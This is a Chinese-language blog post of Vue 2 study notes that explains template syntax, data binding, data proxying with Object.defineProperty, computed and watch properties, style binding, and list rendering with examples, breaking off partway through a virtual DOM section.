---
layout: post
title: Vue2的知识点概览
categories: summary
description: Vue2系统性知识
keywords: 前端框架, Vue
---

# vue基础用法&基础原理整理

# 1. vue基础知识和原理

## 1.1 初识Vue

* 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象
* demo容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法
* demo容器里的代码被称为【Vue模板】
* Vue实例和容器是一一对应的
* 真实开发中只有一个Vue实例，并且会配合着组件一起使用
* { {xxx} }是Vue的语法：插值表达式，{ {xxx} }可以读取到data中的所有属性
* 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新(Vue实现的响应式)



> 初始示例代码

```vue
<!-- 准备好一个容器 -->
<div id="demo">
	<h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
</div>

<script type="text/javascript" >
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	//创建Vue实例
	new Vue({
		el:'#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
		data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
			name:'hello,world',
			address:'北京'
		}
	});

</script>
```



## 1.2 模板语法

Vue模板语法有2大类:

* 插值语法：

  功能：用于解析标签体内容

  写法：{ {xxx} }，xxx是js表达式，且可以直接读取到data中的所有属性

* 指令语法:

  功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）

  举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，且可以直接读取到data中的所有属性

  

> 代码

```vue
<div id="root">
	<h1>插值语法</h1>
	<h3>你好，{{name}}</h3>
	<hr/>
	<h1>指令语法</h1>
    <!-- 这里是展示被Vue指令绑定的属性，引号内写的是js表达式 -->
	<a :href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
	<a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
</div>

<script>
    new Vue({
		el:'#root',
		data:{
			name:'jack',
			school:{
				name:'百度',
				url:'http://www.baidu.com',
			}
        }
	})
</script>
```





## 1.3 数据绑定

Vue中有2种数据绑定的方式：

* 单向绑定(v-bind)：数据只能从data流向页面

* 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data

  > tips: 
  >
  > 1.双向绑定一般都应用在表单类元素上（如：input、select等）
  >
  > 2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值



> 代码

```vue
<div id="root">
	<!-- 普通写法 单向数据绑定 -->
    单向数据绑定：<input type="text" v-bind:value="name"><br/>
    双向数据绑定：<input type="text" v-model:value="name"><br/>
    
    <!-- 简写 v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值-->
    单向数据绑定：<input type="text" :value="name"><br/>
    双向数据绑定：<input type="text" v-model="name"><br/>
</div>

<script>
    new Vue({
		el:'#root',
		data:{
			name:'jack',
        }
	})
</script>
```





## 1.4 el与data的两种写法

el有2种写法

* new Vue时候配置el属性

* 先创建Vue实例，随后再通过vm.$mount('#root')指定el的值

> 代码

```vue
<script>
   	// 第一种 
	const vm = new Vue({
		el:'#root',
		data:{
			name:'jack',
        }
	})
    
    // 第二种
    vm.$mount('#root')
</script>
```



data有2种写法

* 对象式

* 函数式

  > 在组件中，data必须使用函数式



> 代码

```vue
<script>
    new Vue({
		el:'#root',
        // 第一种
		data:{
			name:'jack',
        }
        
        // 第二种
        data() {
        	return {
                name: 'jack'
            }
    	}
	})
</script>
```





## 1.5 Vue中的MVVM

* M：模型(Model) ：data中的数据
* V：视图(View) ：模板代码
* VM：视图模型(ViewModel)：Vue实例





## 1.6 数据代理

> 了解数据代理需要js的一些知识：Object.defineProperty()，属性标志，属性描述符，getter，setter。。。

建议学习文章地址：

https://zh.javascript.info/property-descriptors

https://zh.javascript.info/property-accessors

这里简单介绍一下：

**属性标志**:

对象属性（properties），除 **`value`** 外，还有三个特殊的特性（attributes），也就是所谓的“标志”

* **`writable`** — 如果为 `true`，则值可以被修改，否则它是只可读的
* **`enumerable`** — 如果为 `true`，则表示是可以遍历的，可以在for.. .in   Object.keys()中遍历出来
* **`configurable`** — 如果为 `true`，则此属性可以被删除，这些特性也可以被修改，否则不可以



**Object.getOwnPropertyDescriptor(obj, propertyName)**

> 这个方法是查询有关属性的完整信息 obj是对象， propertyName是属性名

```js
let user = {
  name: "John"
};

let descriptor = Object.getOwnPropertyDescriptor(user, 'name');


console.log(descriptor)

/* 属性描述符：
{
  "value": "John",
  "writable": true,
  "enumerable": true,
  "configurable": true
}
*/
```

> 打印结果

![image-20220321123253628](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220321123253628.png)





**Object.defineProperty**(obj, prop, descriptor)

> obj：要定义属性的对象。
>
> prop：要定义或修改的属性的名称
>
> descriptor：要定义或修改的属性描述符

```js
let user = {
  name: "John"
};

Object.defineProperty(user, "name", {
  writable: false
});

user.name = "Pete";

// 打印后还是显示 'John',无法修改name值
```



其他的属性标志就不演示了，接下来看重点：访问器属性。

**访问器属性：**

本质上是用于获取和设置值的函数，但从外部代码来看就像常规属性。

访问器属性由 “getter” 和 “setter” 方法表示。在对象字面量中，它们用 `get` 和 `set` 表示：

```js
let obj = {
    get name() {
        // 当读取 obj.propName 时，getter 起作用
    },
    set name() {
        // 当执行 obj.name = value 操作时，setter 起作用
    }
}
```

**更复杂一点的使用**

```js
let user = {
	surname: 'gao',
    name: 'han'
    
    get fullName() {
        return this.name + this.surname;
    }
}

console.log(user.fullName)
```

从外表看，访问器属性看起来就像一个普通属性。这就是访问器属性的设计思想。我们不以函数的方式 **调用** `user.fullName`，我们正常 **读取** 它：getter 在幕后运行。

> vue的计算属性的底层构造感觉用到了这种思想，我目前还没看过源码，是这样猜想的。

截至目前，`fullName` 只有一个 getter。如果我们尝试赋值操作 `user.fullName=`，将会出现错误：

```js
user.fullName = "Test"; // Error（属性只有一个 getter）
```

为 `user.fullName` 添加一个 setter 来修复它：

```js
let user = {
	surname: 'gao',
    name: 'han'
    
    get fullName() {
        return this.name + ' ' + this.surname;
    }

	set fullName(value) {
        // 这个用到了新语法 结构赋值
        [this.surname, this.name] = value.split(' ');
    }
}

user.fullName = 'Li Hua'

console.log(user.name);
console.log(user.surname);
```



**终于可以介绍数据代理了**：

数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）

先来看个案例：

```js
let obj = {
    x: 100
}

let obj2 = {
    y: 200
}
```

这时候提一个需求：我们想要访问 **obj** 中的 **x** 的值，但我们最好不要直接去访问 **obj** ,而是想要通过 **obj2** 这个代理对象去访问。

这时候就可以用上 **Object.defineProperty()**，给 **obj2** 添加上访问器属性（也就是getter和setter）

> 代码

```js
let obj = {
    x: 100
}

let obj2 = {
    y: 200
}

Object.defineProperty(obj2, 'x', {
    get() {
        return obj.x;
    },
    set(value) {
        obj.x = value;
    }
})
```

> 这就是数据代理，也不难吧



**接下来介绍Vue中的数据代理**

* Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）
* Vue中数据代理的好处：更加方便的操作data中的数据
* 基本原理：
  * 通过Object.defineProperty()把data对象中所有属性添加到vm上。
  * 为每一个添加到vm上的属性，都指定一个getter/setter。
  * 在getter/setter内部去操作（读/写）data中对应的属性。



我来用一个案例来详细解释这一个过程。

```vue
<!-- 准备好一个容器-->
<div id="root">
	<h2>学校名称：{{name}}</h2>
	<h2>学校地址：{{address}}</h2>
</div>

<script>
	const vm = new Vue({
        el: '#root',
        data: {
            name: '浙江师范大学',
            address: '浙江金华'
        }
    })
</script>
```

我们在控制台打印 new 出来的 vm

![image-20220321131408332](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220321131408332.png)

可以看到，写在配置项中的 data 数据被 绑定到了 vm 对象上，我先来讲结果，是 Vue 将 _data 中的 name，address 数据 代理到 vm 本身上。

> 一脸懵逼？

先来解释下_data 是啥， _data 就是 vm 身上的 _data 属性，就是下图那个

![image-20220321132114627](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220321132114627.png)

这个 _data 是从哪来的？

```vue
<script>
    
	const vm = new Vue({
        el: '#root',
        // 我们在Vue 初始化的配置项中写了 data 属性。
        data: {
            name: '浙江师范大学',
            address: '浙江金华'
        }
    })
</script>
```

new Vue 时， Vue 通过一系列处理， 将匹配项上的 data 数据绑定到了 _data 这个属性上，并对这个属性进行了处理（数据劫持），但这个属性就是来源于配置项中的 data，我们可以来验证一下。

```vue
<script>
    
    let data1 = {
        name: '浙江师范大学',
        address: '浙江金华'
    }
    
	const vm = new Vue({
        el: '#root',
        // 我们在Vue 初始化的配置项中写了 data 属性。
        data: data1
    })
</script>
```

![image-20220321133021821](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220321133021821.png)

> 打印结果为true，说明两者就是同一个



好了，再回到数据代理上来，将 **vm._data** 中的值，再代理到 vm 本身上来，用vm.name 代替 **vm._data.name**。这就是 Vue 的数据代理

![image-20220321133412103](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220321133412103.png)

这一切都是通过 Object.defineProperty() 来完成的，我来模拟一下这个过程

```js
Object.defineProperty(vm, 'name', {
    get() {
        return vm._data.name;
    },
    set(value) {
        vm._data.name = value
    }
})
```

> 这样有啥意义？明明通过 vm._data.name 也可以访问 name 的值，为啥费力去这样操作？

在插值语法中，{ { name } } 取到的值就相当于 { { vm.name } }，不用数据代理的话，在插值语法就要这样去写了。

{ { _data. name } } 这不符合直觉，怪怪的。vue 这样设计更利于开发者开发，我们在研究原理会觉得有些复杂（笑~）

来个尚硅谷张天禹老师做的图（非常推荐去看他的课，讲的非常好）

![数据代理图示](C:\Users\28318\Desktop\vue\vue_basic\06_数据代理\数据代理图示.png)





## 1.7 事件处理

事件的基本使用：

* 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名
* 事件的回调需要配置在methods对象中，最终会在vm上
* methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象



```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <!-- <button v-on:click="showInfo">点我提示信息</button> -->
    <button @click="showInfo1">点我提示信息1（不传参）</button>
    <!-- 主动传事件本身 -->
    <button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            name:'vue',
        },
        methods:{
            // 如果vue模板没有写event，会自动传 event 给函数
            showInfo1(event){
                // console.log(event.target.innerText)
                // console.log(this) //此处的this是vm
                alert('同学你好！')
            },
            showInfo2(event,number){
                console.log(event,number)
                // console.log(event.target.innerText)
                // console.log(this) //此处的this是vm
                alert('同学你好！！')
            }
        }
	});
</script>
```



**Vue中的事件修饰符**

* prevent：阻止默认事件（常用）
* stop：阻止事件冒泡（常用）
* self：事件处理只来自自身（常用）
* once：事件只触发一次（常用）
* capture：指向内部元素的事件，在被内部元素处理前，先被外部处理
* passive：事件的默认行为立刻发生，而非等待“on~~”完成



```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <!-- 阻止默认事件（常用） -->
	<a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息</a>
    <!-- 阻止事件冒泡（常用） -->
    <div class="demo1" @click="showInfo">
        <button @click.stop="showInfo">点我提示信息</button>
        <!-- 修饰符可以连续写 -->
        <!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
    </div>
    
    <!-- 事件只触发一次（常用） -->
    <button @click.once="showInfo">点我提示信息</button>
</div>

<!-- 添加事件监听器时，使用 `capture` 捕获模式 -->
<!-- 例如：指向内部元素的事件，在被内部元素处理前，先被外部处理 -->
<div @click.capture="doThis">...</div>


<!-- 滚动事件的默认行为 (scrolling) 将立即发生而非等待 `onScroll` 完成 -->
<!-- 以防其中包含 `event.preventDefault()` -->
<div @scroll.passive="onScroll">...</div>


```





## 1.8 键盘事件

键盘事件语法糖：@keydown，@keyup

Vue中常用的按键别名：

* 回车 => enter
* 删除 => delete
* 退出 => esc
* 空格 => space
* 换行 => tab (特殊，必须配合keydown去使用)



```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo">
</div>

<script>
    new Vue({
        el:'#root',
        data:{
            name:'浙江理工大学'
        },
        methods: {
            showInfo(e){
                // console.log(e.key,e.keyCode)
                console.log(e.target.value)
            }
        },
    })
</script>
```





## 1.9 计算属性

* 定义：要用的属性不存在，要通过已有属性计算得来
* 原理：底层借助了Objcet.defineProperty方法提供的getter和setter
* get函数什么时候执行？
  * (1).初次读取时会执行一次
  * (2).当依赖的数据发生改变时会被再次调用
* 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便
* 备注：
  * 计算属性最终会出现在vm上，直接读取使用即可
  * 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变



> 计算属性完整版写法

```vue
<!-- 准备好一个容器-->
<div id="root">
    姓：<input type="text" v-model="firstName">
    名：<input type="text" v-model="lastName"> 
    全名：<span>{{fullName}}</span>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            firstName:'张',
            lastName:'三',
        }
        computed:{
            fullName:{
                //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
                //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
                get(){
                    console.log('get被调用了')
                    return this.firstName + '-' + this.lastName
                },
                //set什么时候调用? 当fullName被修改时。
                // 可以主动在控制台修改fullName来查看情况
                set(value){
                    console.log('set',value)
                    const arr = value.split('-')
                    this.firstName = arr[0]
                    this.lastName = arr[1]
                }
            }
        }
    })
</script>
```

![image-20220322111732512](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220322111732512.png)

> 计算属性简写

```vue
<!-- 准备好一个容器-->
<div id="root">
    姓：<input type="text" v-model="firstName">
    名：<input type="text" v-model="lastName"> 
    全名：<span>{{fullName}}</span>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            firstName:'张',
            lastName:'三',
        }
        computed:{
            fullName() {
        		console.log('get被调用了')
				return this.firstName + '-' + this.lastName
    		}
        }
    })
</script>
```





## 1.10 监视属性

监视属性watch：

* 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
* 监视的属性必须存在，才能进行监视
* 监视的两种写法：
  * (1).new Vue时传入watch配置
  * (2).通过vm.$watch监视



> 第一种写法

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2>今天天气很{{ info }}</h2>
    <button @click="changeWeather">切换天气</button>
</div>


<script>
	const vm = new Vue({
        el:'#root',
        data:{
            isHot:true,
        },
        computed:{
            info(){
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        methods: {
            changeWeather(){
                this.isHot = !this.isHot
            }
        },
        watch:{
            isHot:{
                immediate: true, // 初始化时让handler调用一下
                // handler什么时候调用？当isHot发生改变时。
                handler(newValue, oldValue){
                    console.log('isHot被修改了',newValue,oldValue)
                }
            }
        } 
    })
</script>
```

> 第二种写法

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2>今天天气很{{ info }}</h2>
    <button @click="changeWeather">切换天气</button>
</div>


<script>
	const vm = new Vue({
        el:'#root',
        data:{
            isHot:true,
        },
        computed:{
            info(){
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        methods: {
            changeWeather(){
                this.isHot = !this.isHot
            }
        }
    })
    
    vm.$watch('isHot',{
        immediate:true, //初始化时让handler调用一下
        //handler什么时候调用？当isHot发生改变时。
        handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
        }
    })
</script>
```



**深度监视：**

* (1).Vue中的watch默认不监测对象内部值的改变（一层）
* (2).配置deep:true可以监测对象内部值改变（多层）



> 备注：
>
> (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以
>
> (2).使用watch时根据数据的具体结构，决定是否采用深度监视



```vue
<!-- 准备好一个容器-->
<div id="root">
    {{numbers.c.d.e}}
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    const vm = new Vue({
        el:'#root',
        data:{
            numbers:{
                c:{
                    d:{
                        e:100
                    }
                }
            }
        },
        watch:{
            //监视多级结构中某个属性的变化
            /* 'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} */
            //监视多级结构中所有属性的变化
            numbers:{
                deep:true,
                handler(){
                    console.log('numbers改变了')
                }
            }
        }
    });
</script>
```

![image-20220322114717167](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220322114717167.png)



> 监视属性简写



```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2>今天天气很{{info}}</h2>
    <button @click="changeWeather">切换天气</button>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            isHot:true,
        },
        computed:{
            info(){
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        methods: {
            changeWeather(){
                this.isHot = !this.isHot
            }
        },
        watch:{
            //简写
            isHot(newValue, oldValue) {
					console.log('isHot被修改了', newValue, oldValue, this)
			} 
        }
    })
</script>
```



**computed和watch之间的区别：**

* computed能完成的功能，watch都可以完成
* watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作

> 两个重要的小原则：
>
> 1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象
>
> 2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象



```vue
<!-- 准备好一个容器-->
<div id="root">
    姓：<input type="text" v-model="firstName"> <br/><br/>
    名：<input type="text" v-model="lastName"> <br/><br/>
    全名：<span>{{fullName}}</span> <br/><br/>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            firstName:'张',
            lastName:'三',
            fullName:'张-三'
        },
        watch:{
            // watch 监视器里可以写 异步函数
            firstName(val){
                setTimeout(()=>{
                    console.log(this)
                    this.fullName = val + '-' + this.lastName
                },1000);
            },
            lastName(val){
                this.fullName = this.firstName + '-' + val
            }
        }
    })
</script>
```





## 1.11 绑定样式

### **class样式**

写法：:class="xxx"    xxx可以是字符串、对象、数。

所以分为三种写法，字符串写法，数组写法，对象写法



**字符串写法**

字符串写法适用于：类名不确定，要动态获取。

```vue
<style>
	.normal{
        background-color: skyblue;
    }
</style>

<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
    <div class="basic" :class="mood" @click="changeMood">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            mood:'normal'
        }
    })
</script>
```





**数组写法**

数组写法适用于：要绑定多个样式，个数不确定，名字也不确定。

```vue
<style>
    .atguigu1{
        background-color: yellowgreen;
    }
    .atguigu2{
        font-size: 30px;
        text-shadow:2px 2px 10px red;
    }
    .atguigu3{
        border-radius: 20px;
    }
</style>

<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
	<div class="basic" :class="classArr">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            classArr: ['atguigu1','atguigu2','atguigu3']
        }
    })
</script>
```





**对象写法**

对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

```vue
<style>
    .atguigu1{
        background-color: yellowgreen;
    }
    .atguigu2{
        font-size: 30px;
        text-shadow:2px 2px 10px red;
    }
</style>

<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
	<div class="basic" :class="classObj">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            classObj:{
                atguigu1:false,
                atguigu2:false,
			}
        }
    })
</script>
```



### **style样式**

有两种写法，对象写法，数组写法

**对象写法**

```vue
<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定style样式--对象写法 -->
	<div class="basic" :style="styleObj">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            styleObj:{
                fontSize: '40px',
                color:'red',
			}
        }
    })
</script>
```



**数组写法**

```vue
<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定style样式--数组写法 -->
	<div class="basic" :style="styleArr">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            styleArr:[
                {
                    fontSize: '40px',
                    color:'blue',
                },
                {
                    backgroundColor:'gray'
                }
            ]
        }
    })
</script>
```





## 1.12 条件渲染

### v-if

* 写法：

  (1).v-if="表达式" 

  (2).v-else-if="表达式"

  (3).v-else="表达式"

* 适用于：切换频率较低的场景

* 特点：不展示的DOM元素直接被移除

* 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”



```vue
<!-- 准备好一个容器-->
<div id="root">
    <!-- 使用v-if做条件渲染 -->
    <h2 v-if="false">欢迎来到{{name}}</h2>
    <h2 v-if="1 === 1">欢迎来到{{name}}</h2>
    
    
    <!-- v-else和v-else-if -->
    <div v-if="n === 1">Angular</div>
    <div v-else-if="n === 2">React</div>
    <div v-else-if="n === 3">Vue</div>
    <div v-else>哈哈</div>
    
    
    <!-- v-if与template的配合使用 -->
    <!-- 就不需要写好多个判断，写一个就行 -->
    <!-- 这里的思想就像事件代理的使用 -->
    <template v-if="n === 1">
        <h2>你好</h2>
        <h2>尚硅谷</h2>
        <h2>北京</h2>
    </template>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            styleArr:[
                {
                    fontSize: '40px',
                    color:'blue',
                },
                {
                    backgroundColor:'gray'
                }
            ]
        }
    })
</script>
```



### **v-show**

* 写法：v-show="表达式"
* 适用于：切换频率较高的场景
* 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉(display:none)



> 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到
>
> v-if 是实打实地改变dom元素，v-show 是隐藏或显示dom元素

```vue
<!-- 准备好一个容器-->
<div id="root">
    <!-- 使用v-show做条件渲染 -->
    <h2 v-show="false">欢迎来到{{name}}</h2>
    <h2 v-show="1 === 1">欢迎来到{{name}}</h2>
</div>
```





## 1.13 列表渲染

### v-for指令

* 用于展示列表数据
* 语法：v-for="(item, index) in xxx" :key="yyy"
* 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）



```vue
<div id="root">
    <!-- 遍历数组 -->
    <h2>人员列表（遍历数组）</h2>
    <ul>
        <li v-for="(p,index) of persons" :key="index">
            {{p.name}}-{{p.age}}
        </li>
    </ul>

    <!-- 遍历对象 -->
    <h2>汽车信息（遍历对象）</h2>
    <ul>
        <li v-for="(value,k) of car" :key="k">
            {{k}}-{{value}}
        </li>
    </ul>

    <!-- 遍历字符串 -->
    <h2>测试遍历字符串（用得少）</h2>
    <ul>
        <li v-for="(char,index) of str" :key="index">
            {{char}}-{{index}}
        </li>
    </ul>

    <!-- 遍历指定次数 -->
    <h2>测试遍历指定次数（用得少）</h2>
    <ul>
        <li v-for="(number,index) of 5" :key="index">
            {{index}}-{{number}}
        </li>
    </ul>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data: {
			persons: [
				{ id: '001', name: '张三', age: 18 },
				{ id: '002', name: '李四', age: 19 },
				{ id: '003', name: '王五', age: 20 }
			],
			car: {
				name: '奥迪A8',
				price: '70万',
				color: '黑色'
			},
			str: 'hello'
		}
    })
</script>
```



### **key的原理**

vue中的key有什么作用？（key的内部原理）

了解vue中key的原理需要一些前置知识。

就是vue的虚拟dom，vue会根据 data中的数据生成虚拟dom，如果是第一次生成页面，就将虚拟dom转成真实dom，在页面展示出来。

虚拟dom有啥用？每次vm._data 中的数据更改，都会触发生成新的虚拟dom，新的虚拟dom会跟旧的虚拟dom进行比较，如果有相同的，在生成真实dom时，这部分相同的就不需要重新生成，只需要将两者之间不同的dom转换成真实dom，再与原来的真实dom进行拼接。我的理解是虚拟dom就是起到了一个dom复用的作用，还有避免重复多余的操作，下文有详细解释。



而key有啥用？

key是虚拟dom的标识。



先来点预备的知识：啥是真实 DOM？真实 DOM 和 虚拟 DOM 有啥区别？如何用代码展现真实 DOM 和 虚拟 DOM

#### 真实`DOM`和其解析流程

这里参考超级英雄大佬：https://juejin.cn/post/6844903895467032589

`webkit` 渲染引擎工作流程图

![img](https://upload-images.jianshu.io/upload_images/4345378-b7ccad3bc808783f.png?imageMogr2/auto-orient/strip|imageView2/2/w/624/format/webp)

> 中文版

![img](https://img-blog.csdnimg.cn/img_convert/cd1757feee540ef20c50b81af16d75ca.png)



 所有的浏览器渲染引擎工作流程大致分为5步：创建 `DOM` 树 —> 创建 `Style Rules` -> 构建 `Render` 树 —> 布局 `Layout` -—> 绘制 `Painting`。

* 第一步，构建 DOM 树：当浏览器接收到来自服务器响应的HTML文档后，会遍历文档节点，生成DOM树。需要注意的是在DOM树生成的过程中有可能会被CSS和JS的加载执行阻塞，渲染阻塞下面会讲到。

* 第二步，生成样式表：用 CSS 分析器，分析 CSS 文件和元素上的 inline 样式，生成页面的样式表；

* 渲染阻塞：当浏览器遇到一个script标签时，DOM构建将暂停，直到脚本加载执行，然后继续构建DOM树。每次去执行Javascript脚本都会严重阻塞DOM树构建，如果JavaScript脚本还操作了CSSOM，而正好这个CSSOM没有下载和构建，那么浏览器甚至会延迟脚本执行和构建DOM，直到这个CSSOM的下载和构建。所以，script标签引入很重要，实际使用时可以遵循下面两个原则：

  * css优先：引入顺序上，css资源先于js资源

  * js后置：js代码放在底部，且js应尽量少影响DOM构建

    > 还有一个小知识：当解析html时，会把新来的元素插入dom树里，同时去查找css，然后把对应的样式规则应用到元素上，查找样式表是按照从右到左的顺序匹配的例如：div p {...}，会先寻找所有p标签并判断它的父标签是否为div之后才决定要不要采用这个样式渲染。所以平时写css尽量用class或者id，不要过度层叠

* 第三步，构建渲染树：通过DOM树和CSS规则我们可以构建渲染树。浏览器会从DOM树根节点开始遍历每个可见节点(注意是可见节点)对每个可见节点，找到其适配的CSS规则并应用。渲染树构建完后，每个节点都是可见节点并且都含有其内容和对应的规则的样式。这也是渲染树和DOM树最大的区别所在。渲染是用于显示，那些不可见的元素就不会在这棵树出现了。除此以外，display none的元素也不会被显示在这棵树里。visibility hidden的元素会出现在这棵树里。

* 第四步，**渲染布局**：布局阶段会从渲染树的根节点开始遍历，然后确定每个节点对象在页面上的确切大小与位置，布局阶段的输出是一个盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。

* 第五步，**渲染树绘制**：在绘制阶段，遍历渲染树，调用渲染器的paint()方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。

**注意点：**

**1、`DOM` 树的构建是文档加载完成开始的？** 构建 `DOM` 树是一个渐进过程，为达到更好的用户体验，渲染引擎会尽快将内容显示在屏幕上，它不必等到整个 `HTML` 文档解析完成之后才开始构建 `render` 树和布局。

**2、`Render` 树是 `DOM` 树和 `CSS` 样式表构建完毕后才开始构建的？** 这三个过程在实际进行的时候并不是完全独立的，而是会有交叉，会一边加载，一边解析，以及一边渲染。

**3、`CSS` 的解析注意点？** `CSS` 的解析是从右往左逆向解析的，嵌套标签越多，解析越慢。

**4、`JS` 操作真实 `DOM` 的代价？**传统DOM结构操作方式对性能的影响很大，原因是频繁操作DOM结构操作会引起页面的重排(reflow)和重绘(repaint)，浏览器不得不频繁地计算布局，重新排列和绘制页面元素，导致浏览器产生巨大的性能开销。直接操作真实`DOM`的性能特别差，我们可以来演示一遍。

```js
<div id="app"></div>
<script>
    // 获取 DIV 元素
    let box = document.querySelector('#app');
    console.log(box);

    // 真实 DOM 操作
    console.time('a');
    for (let i = 0; i <= 10000; i++) {
        box.innerHTML = i;
    }
    console.timeEnd('a');

    // 虚拟 DOM 操作
    let num = 0;
    console.time('b');
    for (let i = 0; i <= 10000; i++) {
        num = i;
    }
    box.innerHTML = num;
    console.timeEnd('b');

</script>
```

![image-20220322180402052](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220322180402052.png)

>从结果中可以看出，操作真实 DOM 的性能是非常差的，所以我们要尽可能的复用，减少 DOM 操作。





#### **虚拟 DOM 的好处**

​	虚拟 `DOM` 就是为了解决浏览器性能问题而被设计出来的。如前，若一次操作中有 10 次更新 `DOM` 的动作，虚拟 `DOM` 不会立即操作 `DOM`，而是将这 10 次更新的 `diff` 内容保存到本地一个 `JS` 对象中，最终将这个 `JS` 对象一次性 `attach` 到 `DOM` 树上，再进行后续操作，避免大量无谓的计算量。所以，用 `JS` 对象模拟 `DOM` 节点的好处是，页面的更新可以先全部反映在 `JS` 对象(虚拟 `DOM` )上，操作内存中的 `JS` 对象的速度显然要更快，等更新完成后，再将最终的 `JS` 对象映射成真实的 `DOM`，交由浏览器去绘制。

​	虽然这一个虚拟 DOM 带来的一个优势，但并不是全部。虚拟 DOM 最大的优势在于抽象了原本的渲染过程，实现了跨平台的能力，而不仅仅局限于浏览器的 DOM，可以是安卓和 IOS 的原生组件，可以是近期很火热的小程序，也可以是各种GUI。

​	回到最开始的问题，虚拟 DOM 到底是什么，说简单点，就是一个普通的 JavaScript 对象，包含了 `tag`、`props`、`children` 三个属性。

> 接下来我们手动实现下 虚拟 DOM。
>
> 分两种实现方式：
>
> 一种原生 js DOM 操作实现；
>
> 另一种主流虚拟 DOM 库（snabbdom、virtual-dom）的实现（用h函数渲染）（暂时还不理解）



**算法实现**

**（1）**用 JS 对象模拟 DOM 树：

```js
<div id="virtual-dom">
    <p>Virtual DOM</p>
    <ul id="list">
      <li class="item">Item 1</li>
      <li class="item">Item 2</li>
      <li class="item">Item 3</li>
    </ul>
    <div>Hello World</div>
</div> 
```

我们用 `JavaScript` 对象来表示 `DOM` 节点，使用对象的属性记录节点的类型、属性、子节点等。

```js
/**
 * Element virdual-dom 对象定义
 * @param {String} tagName - dom 元素名称
